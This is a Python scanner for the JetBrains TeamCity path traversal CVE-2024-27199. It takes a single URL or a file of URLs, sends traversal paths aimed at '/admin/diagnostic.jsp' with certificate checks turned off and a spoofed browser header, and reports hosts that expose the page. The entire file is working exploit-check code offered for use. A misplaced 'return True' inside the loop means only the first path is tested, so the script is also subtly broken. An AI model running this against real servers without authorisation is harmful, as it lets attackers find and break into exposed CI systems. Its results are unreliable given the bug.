import requests
from urllib.parse import urlparse,urljoin
import argparse
import urllib3
import ssl
import urllib.request
import random
import string
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def check(url):
    try:
        url = url.rstrip('/')
        paths=[
            "/.well-known/acme-challenge/../../admin/diagnostic.jsp",
            "/res/../admin/diagnostic.jsp",
            "/update/../admin/diagnostic.jsp"
        ]
        headers = {
            "User-Agent": 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        for path in paths:
            target = url + path
            response = urllib.request.Request(target, headers=headers, method="GET", unverifiable=True)
            res = urllib.request.urlopen(response)
            status_code = res.getcode()
            content = res.read().decode()
            if status_code == 200 and 'CPU & Memory Usage' in content and 'CPU' in content:
                print(f"\033[31mDiscovered:{url}: JetBrainsTeamCity_CVE-2024-27199_PathTraversal\033[0m")
            return True
    except Exception as e:
        pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)